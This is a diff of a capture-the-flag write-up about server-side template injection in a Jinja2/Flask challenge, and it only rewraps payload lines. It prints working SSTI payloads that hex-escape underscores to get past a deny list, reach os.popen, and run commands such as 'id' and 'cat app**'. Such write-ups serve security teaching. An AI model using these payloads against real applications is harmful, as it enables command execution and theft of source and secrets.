@@ -35,14 +35,18 @@ The cheat sheet on [[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/ma
 
 #+CAPTION: Payload all the things payload
 #+begin_src javascript
-{{request|attr("application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+{{request|attr("application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')
+('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|
+attr('popen')('id')|attr('read')()}}
 #+end_src
 
 But obviously there are illegal characters in it. The ="= can be replaced with ="= however and this payload will work.
 
 #+CAPTION: Adjusted payload for allowed characters
 #+begin_src javascript
-{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("id")|attr("read")()}}
+{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")
+  ("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|
+  attr("popen")("id")|attr("read")()}}
 #+end_src
 
 #+CAPTION: Bypassing the deny list
@@ -52,7 +56,9 @@ From here the challenge is the same as the previous one.
 
 #+CAPTION: Payload to get the sources
 #+begin_src javascript
-{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("cat app**")|attr("read")()}}
+{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")
+  ("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|
+  attr("popen")("cat app**")|attr("read")()}}
 #+end_src
 
 The source does not contain the flag however, this needs to be taken from the =config= variable again. Searching the internet will yield several ways of accessing the config dictionary. Below is one.
